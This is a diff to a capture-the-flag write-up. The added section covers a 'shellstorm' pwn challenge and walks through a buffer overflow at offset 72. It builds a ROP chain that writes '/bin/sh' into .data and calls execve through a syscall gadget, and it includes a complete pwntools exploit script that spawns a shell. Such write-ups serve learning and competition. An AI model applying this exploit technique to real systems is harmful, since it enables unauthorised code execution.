@@ -17,6 +17,12 @@
 ## Cryptography
 - Row row row your boat
 
+## Forensics
+- Veil of shadow
+- Unveiling
+
+#### PWN
+
 ### Puts in boot [First Blood 🩸]
 
 We are given a binary file attached to it
@@ -1147,14 +1153,147 @@ Now here's the idea of how I'll go about the write
 pop rax; 0x2f62696e2f736800
 pop rdi; 0x000000000404038
 mov qword ptr [rdi], rax; ret;
+syscall
 ```
 
-With
+With that the value of `/bin/sh` will be stored in the `.data` section of the binary
 
+Next thing is how do we spawn shell?
 
+From the [syscall](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md) of `execve` 
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/26125e5e-6ff6-4219-ab70-59160bb529e3)
 
+```
+syscall name  | %rax    | %rdi              | %rsi                | %rdx
+execve           0x3b     char *filename      char *const *argv      char *const *envp
+```
 
+In this case we would want to call `/bin/sh` and it doesn't require any parameter so our instruction will be
 
+```
+execve('/bin/sh\x00', 0x0, 0x0)
+```
 
+The equivalent assembly instruction is:
 
+```s
+; Call execve
+pop rax, 0x3b
+pop rdi, 0x000000000404038
+pop rsi, 0x0
+pop rdx, 0x0
+syscall
+```
+
+The syscall gadget is this
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/6d05916a-2de2-4405-a1ea-e761465ae5cf)
+
+Cool with that let us get the offset needed to overwrite the instruction pointer 
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/3def84c4-1ebd-4a21-a5d7-00cd53990d64)
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/930a1b26-65db-4f7f-b862-11a32046dd49)
+
+The offset is `72`
+
+Here's my exploit [script](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/bicdefcon_23/shellstorm/exploit.py)
+
+```python
+from pwn import *
+import warnings
+
+# Allows you to switch between local/GDB/remote from terminal
+def start(argv=[], *a, **kw):
+    if args.GDB:  # Set GDBscript below
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE:  # ('server', 'port')
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:  # Run locally
+        return process([exe] + argv, *a, **kw)
+
+# Specify GDB script here (breakpoints etc)
+gdbscript = '''
+init-pwndbg
+continue
+'''.format(**locals())
+
+# Binary filename
+exe = './shellstorm'
+# This will automatically get context arch, bits, os etc
+elf = context.binary = ELF(exe, checksec=False)
+# Change logging level to help with debugging (error/warning/info/debug)
+context.log_level = 'info'
+warnings.filterwarnings("ignore")
+
+# ===========================================================
+# ➜  shellstorm seccomp-tools dump ./shellstorm 
+#  line  CODE  JT   JF      K
+# =================================
+#  0000: 0x20 0x00 0x00 0x00000004  A = arch
+#  0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008
+#  0002: 0x20 0x00 0x00 0x00000000  A = sys_number
+#  0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
+#  0004: 0x15 0x00 0x03 0xffffffff  if (A != 0xffffffff) goto 0008
+#  0005: 0x15 0x02 0x00 0x00000002  if (A == open) goto 0008
+#  0006: 0x15 0x01 0x00 0x00000028  if (A == sendfile) goto 0008
+#  0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+#  0008: 0x06 0x00 0x00 0x00000000  return KILL
+# ===========================================================
+
+io = start()
+
+pop_rax = p64(0x00000000004011a1) # pop rax; ret; 
+pop_rdi = p64(0x00000000004011a3) # pop rdi; ret; 
+pop_rsi = p64(0x00000000004011a5) # pop rsi; ret; 
+pop_rdx = p64(0x00000000004011a7) # pop rdx; ret; 
+syscall = p64(0x0000000000401196) # syscall; ret; 
+write = p64(0x00000000004011a9) # mov qword ptr [rdi], rax; ret; 
+data = p64(0x000000000404038)
+offset = 72
+
+# ===========================================================
+# Write /bin/sh to 0x000000000404038
+# pop rax, 0x2f62696e2f736800
+# pop rdi, 0x000000000404038
+# mov qword ptr [rdi], rax; ret; 
+# ===========================================================
+
+rop = b''
+rop += pop_rax
+rop += b"/bin/sh\x00"
+rop += pop_rdi
+rop += data
+rop += write
+
+# ===========================================================
+# Set up register 
+# pop rax, 0x3b
+# pop rdi, 0x6b6000
+# pop rsi, 0x0
+# pop rdx, 0x0
+
+# syscall
+# ===========================================================
+
+rop += pop_rax
+rop += p64(0x3b)
+rop += pop_rdi
+rop += data
+rop += pop_rsi
+rop += p64(0x0)
+rop += pop_rdx
+rop += p64(0x0)
+rop += syscall
+
+offset = 72
+io.sendline(b'A'*offset + rop)
+payload = b'A'*offset + rop
+
+io.interactive()
+```
+
+Running it spawns a shell
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/0145715f-2188-42a3-910d-ad5e083373ab)
+
+------------------------
+I'll add more pwn later
+------------------------
 
